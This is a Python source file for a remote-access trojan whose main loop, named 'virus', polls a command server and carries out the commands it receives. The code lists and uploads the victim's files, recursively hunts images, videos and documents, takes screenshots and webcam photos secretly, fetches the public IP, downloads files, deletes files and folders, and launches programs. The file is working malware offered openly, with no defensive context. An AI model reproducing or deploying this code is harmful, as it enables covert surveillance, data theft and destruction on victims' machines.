import requests, os, shutil
from bs4 import BeautifulSoup
import lxml
import numpy as np
import cv2
import pyautogui
from itertools import zip_longest
import wget

website = 'https://127.0.0.1:5000/'
current_path = os.environ['USERPROFILE']
msg = False

def remove(command):
    requests.get(website + 'remove' + command)

def view_files(location):
    def search(path, extension):
        for item in os.listdir(path):
            if "." in item:
                if extension in item:
                    requests.get(website + 'files/' + item)
                else:
                    pass
            elif "." not in item:
                try:
                    search(path + "\\" + item, extension)
                except:
                    pass
    search(location, ".jpg")
    search(location, ".png")
    search(location, ".mp4")
    search(location, ".mp3")
    search(location, ".txt")
    search(location, ".doc")
    search(location, ".pdf")

def search_file(path, name):
    global msg
    for item in os.listdir(path):
        if item == name:
            requests.get(website + 'files/' + path)
            msg = True
        elif "." not in item:
            try:
                search_file(path + "\\" + item, name)
            except:
                pass
def virus():
    global current_path
    while True:
        content = requests.get(website).content
        if str(content)[493] != '<':
            soup = BeautifulSoup(content, "lxml")
            command = soup.find_all("h6", {"class":"command"})[0].text
            if command == "get_user":
                requests.post(website + 'response', data={'answer':current_path.replace("\\", "|")})
                requests.get(website + 'done/true')
                remove(command)
            elif command == "ls":
                try:
                    files = os.listdir(current_path)
                    for file in files:
                        requests.get(website + 'files/' + file)
                except:
                    pass
                requests.get(website + 'done/true')
                remove(command)
            elif command == "echo":
                filename = soup.find_all("h6", {"class":"filename"})[0].text
                text = soup.find_all("h6", {"class":"text"})[0].text
                open(current_path + '\\' + filename, 'a').write(text)
                remove(command)
            elif command == "view_files":
                path = soup.find_all("h6", {"class":"path"})[0].text
                view_files(path.replace("|", "\\"))
                requests.get(website + 'done/true')
                remove(command)
            elif command == "recv_file":
                filename = soup.find_all("h6", {"class":"filename"})[0].text
                requests.post(website + 'upload', files={'file':open(current_path + '\\' + filename, 'rb')})
                requests.get(website + 'done/true')
                remove(command)
            elif command == "recv_files":
                files = os.listdir(current_path)
                for file in files:
                    try:
                        requests.post(website + 'upload', files={'file':open(current_path + '\\' + file, 'rb')})
                        requests.get(website + 'files/' + file)
                    except:
                        pass
                requests.get(website + 'done/true')
                remove(command)
            elif command == "send_file":
                filename = soup.find_all("h6", {"class":"filename"})[0].text
                wget.download(website + 'static/' + filename)
                remove(command)
            elif command == "cd..":
                current_path = current_path[::-1]
                to_re = ""
                for l in current_path:
                    if l == "\\":
                        to_re += l
                        break
                    else:
                        to_re += l

                current_path = current_path.replace(to_re, "", 1)
                current_path = current_path[::-1]
                requests.post(website + 'response', data={'answer':current_path.replace("\\", "|")})
                requests.get(website + 'done/true')
                remove(command)
            elif command == "get_ip":
                ip = requests.get("https://api.ipify.org").text
                requests.post(website + 'response', data={'answer':ip})
                requests.get(website + 'done/true')
                remove(command)
            elif command == "screen":
                image = pyautogui.screenshot()
                image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
                cv2.imwrite(current_path + "\\screenshot.jpg", image)
                requests.post(website + 'upload', files={'file':open(current_path + '\\screenshot.jpg', 'rb')})
                requests.get(website + 'done/true')
                os.remove(current_path + '\\screenshot.jpg')
                remove(command)
            elif command == "take_pic":
                cam_port = 0
                cam = cv2.VideoCapture(cam_port)
                result, image = cam.read()
                cv2.imwrite(current_path + '\\capture.jpg', image)
                requests.post(website + 'upload', files={'file':open(current_path + '\\capture.jpg', 'rb')})
                requests.get(website + 'done/true')
                os.remove(current_path + '\\capture.jpg')
                remove(command)
                break
            elif "cd" in command:
                dir = command.replace("cd ", "", 1)
                current_path += '\\' + dir
                requests.post(website + 'response', data={'answer':current_path.replace("\\", "|")})
                requests.get(website + 'done/true')
                remove(command)
            elif "md" in command:
                os.mkdir(os.path.join(current_path + '\\', command.replace("md ", "", 1)))
                remove(command)
            elif "rd" in command:
                shutil.rmtree(current_path + '\\', command.replace("rd ", "", 1))
                remove(command)
            elif "del" in command:
                os.remove(current_path + '\\' + command.replace("del ", "", 1))
                remove(command)
            elif "search" in command:
                path = soup.find_all("h6", {"class":"path"})[0].text
                search_file(path.replace("|", "\\"), command.replace("search ", "", 1))
                if msg == False:
                    requests.get(website + 'files/there is no file with this name')
                requests.get(website + 'done/true')
                remove(command)
            elif "call" in command:
                os.system("start " + current_path + '\\' + command.replace("call ", "", 1))
                remove(command)
        else:
            pass

while True:
    virus()